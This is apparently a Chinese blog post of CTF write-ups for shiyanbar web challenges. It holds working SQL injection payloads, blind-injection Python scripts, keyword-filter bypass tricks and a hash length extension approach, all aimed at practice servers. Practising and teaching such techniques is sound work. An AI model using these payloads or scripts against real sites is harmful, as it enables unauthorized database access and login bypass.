@@ -1,0 +1,1479 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧web">
+<meta property="og:url" content="http://chaosec.top/2018/06/10/实验吧web/index.html">
+<meta property="og:site_name" content="Charles&#39; Blog">
+<meta property="og:description" content="前言最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://chaosec.top/2018/06/10/实验吧web/1.png">
+<meta property="og:updated_time" content="2019-01-30T11:51:11.305Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧web">
+<meta name="twitter:description" content="前言最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目">
+<meta name="twitter:image" content="http://chaosec.top/2018/06/10/实验吧web/1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Charles' Blog" type="application/atom+xml"/>
+
+
+
+
+  <link rel="canonical" href="http://chaosec.top/2018/06/10/实验吧web/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>实验吧web | Charles' Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Charles' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2018/06/10/实验吧web/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新城瑞雪"/>
+      <meta itemprop="description" content="相逢意气为君饮"/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charles' Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">实验吧web
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-06-10 22:48:28" itemprop="dateCreated datePublished" datetime="2018-06-10T22:48:28+08:00">2018-06-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-01-30 19:51:11" itemprop="dateModified" datetime="2019-01-30T19:51:11+08:00">2019-01-30</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+            <span id="/2018/06/10/实验吧web/" class="leancloud_visitors" data-flag-title="实验吧web">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目</p>
+<a id="more"></a>
+<h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>打开网页后查看元素发现sql逻辑语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'".md5($password,true)."'</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+<p>这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 <code>&#39; or &#39;a</code> 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 <code>ffifdyop</code> ,直接提交一下这个东西，居然正好就是可以。</p>
+<h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys = string.ascii_lowercase + <span class="string">r'!_&#123;&#125;@~,'</span> + string.digits</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_yes = <span class="string">'You are our member'</span></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/baocuo/index.php'</span></span><br><span class="line">payload = <span class="string">"' or (select group_concat(column_name) from information_schema.tables where !(table_schema &lt;&gt; database())) regexp '^&#123;&#125;' and 2&gt;'1"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:<span class="string">'aa'</span>,<span class="string">'password'</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> keys:</span><br><span class="line">		tmp = item</span><br><span class="line">		data[<span class="string">'password'</span>] = payload.format(flag + tmp)</span><br><span class="line">		res = requests.post(url,data=data).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += tmp</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	print(i)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'database:'</span>,flag)</span><br></pre></td></tr></table></figure>
+<h1 id="认真一点！"><a href="#认真一点！" class="headerlink" title="认真一点！"></a>认真一点！</h1><p>这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了</p>
+<p>直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现<br><code>and,空格，^,union,substr,逗号,%</code>等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合<code>id=0&#39;%0aoorr%0a&#39;or&#39;=&#39;*</code>，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/**/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">keys = string.ascii_lowercase + string.digits + <span class="string">r'!_&#123;&#125;@~.'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_yes = <span class="string">'You are in'</span></span><br><span class="line">url = <span class="string">r'http://ctf5.shiyanbar.com/web/earnest/index.php'</span></span><br><span class="line">payload = <span class="string">"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a"</span> + <span class="string">"'&#123;&#125;$')"</span> + <span class="string">"%0aoorr%0a'b'='a"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_inje</span><span class="params">(payload)</span>:</span></span><br><span class="line">	flag = <span class="string">''</span></span><br><span class="line">	data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">	ok = <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">while</span> ok:</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> keys:</span><br><span class="line">			data[<span class="string">'id'</span>] = parse.unquote(payload.format(item + flag))</span><br><span class="line">			res = requests.post(url,data=data).text</span><br><span class="line">			<span class="comment"># print(payload.format(item + flag))</span></span><br><span class="line">			<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">				flag = item + flag</span><br><span class="line">				print(flag)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">if</span> item == <span class="string">'.'</span>:</span><br><span class="line">				ok = <span class="keyword">False</span></span><br><span class="line">	print(<span class="string">'[+]:'</span>,flag)</span><br><span class="line"><span class="comment"># blind_inje(payload)</span></span><br><span class="line"><span class="comment"># table_name:fiag@users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = "0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a" + "'&#123;&#125;$')" + "%0aoorr%0a'b'='a"</span></span><br><span class="line"><span class="comment"># blind_inje(payload1)</span></span><br><span class="line"><span class="comment"># column_name:fl.4g或者fl$4g</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'&#123;&#125;$')%0aoorr%0a'b'='a"</span></span><br><span class="line">blind_inje(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag:flag&#123;haha~you.win!&#125;注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次</span></span><br><span class="line"><span class="comment"># flag:flag&#123;haha~you win!&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h1><p>题目给出了加密代码，直接逆向跑一遍就好了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$str = <span class="string">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span>;</span><br><span class="line">$str = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">	$_c = substr($str, $i, <span class="number">1</span>);</span><br><span class="line">	$a = ord($_c);</span><br><span class="line">	$b = chr($a<span class="number">-1</span>);</span><br><span class="line">	$flag = $flag.$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="登录一下好吗"><a href="#登录一下好吗" class="headerlink" title="登录一下好吗"></a>登录一下好吗</h1><p>先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 <code>uesrname=admin&#39; or 1=1</code>,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=<span class="string">'='</span>&amp;password=<span class="string">'='</span></span><br></pre></td></tr></table></figure>
+<p>那么在数据库中就变成了 <code>select * from users where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39;</code> ，所以就成了<code>select * from users where 1 and 1</code> 注意他逻辑运算的时候是一次从前往后运算的。</p>
+<h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url).headers[<span class="string">'FLAG'</span>]</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(response)</span><br><span class="line"></span><br><span class="line">flag = flag.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">flag = flag.split(<span class="string">':'</span>)</span><br><span class="line">flag = flag[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'key'</span>:flag&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url,data=data).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<p>可以得到flag</p>
+<h1 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h1><p>修改cookie里的source的值为1可以看到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的</p>
+<p><img src="/2018/06/10/实验吧web/1.png" alt="payload"></p>
+<h1 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h1><p>题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/index_3.php'</span></span><br><span class="line">payload = <span class="string">"?id=0' or (substr(database(),&#123;&#125;,1)='&#123;&#125;')%23"</span>  <span class="comment"># database:web1</span></span><br><span class="line">words = string.ascii_lowercase + string.digits + <span class="string">'&#123;&#125;_!~@%^&amp;*-'</span></span><br><span class="line">flag_yes = <span class="string">'Hello'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">payload1 = <span class="string">"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="comment"># table_name: flag@web1</span></span><br><span class="line">payload2 = <span class="string">"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where table_name='flag'),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="comment"># column_name = flag@id</span></span><br><span class="line">payload3 = <span class="string">"?id=0' or (substr((select group_concat(flag separator '@') from flag),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> words:</span><br><span class="line">		res = requests.get(url + payload3.format(str(i),item)).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += item</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> item == <span class="string">'-'</span>:</span><br><span class="line">			print(<span class="string">'end'</span>)</span><br><span class="line"><span class="comment"># flag&#123;y0u_@r3_5o_damn_90od&#125; 大小写可能有问题</span></span><br></pre></td></tr></table></figure>
+<p>本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。</p>
+<h1 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h1><p>线简单测试一下 <code>id=1&#39;</code> 页面回显报错，尝试报错注入，可以得到数据库名为 <code>web1</code> ，在尝试一下过滤了那些字符没回发现过滤了许多字符 <code>from</code> , <code>where</code> ,<br><code>group_concat</code> , <code>order</code> , <code>union</code> ，这里有许多字符过滤时另加了一个空格，很恶心。</p>
+<p>最后用报错注入老是有问题，后来决定换union试一下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=0' uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere <span class="attribute">table_sctable_schemahema</span>=<span class="string">'web1</span></span><br></pre></td></tr></table></figure>
+<p>可知表名<code>flag,web_1</code> ,</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=0' uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere <span class="attribute">table_name</span>=<span class="string">'flag</span></span><br></pre></td></tr></table></figure>
+<p>结果返回权限不够</p>
+<blockquote>
+<p>SELECT command denied to user ‘web1’@’localhost’ for table ‘columns’</p>
+</blockquote>
+<p>又看到题目说获取flag值，猜测列名应该是flag，</p>
+<p>最终payload</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">' uunion nion selselect ect flag frfrom om flag whwhere ere '</span><span class="keyword">a</span><span class="string">'='</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>
+<h1 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h1><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>'%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/**/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号</p>
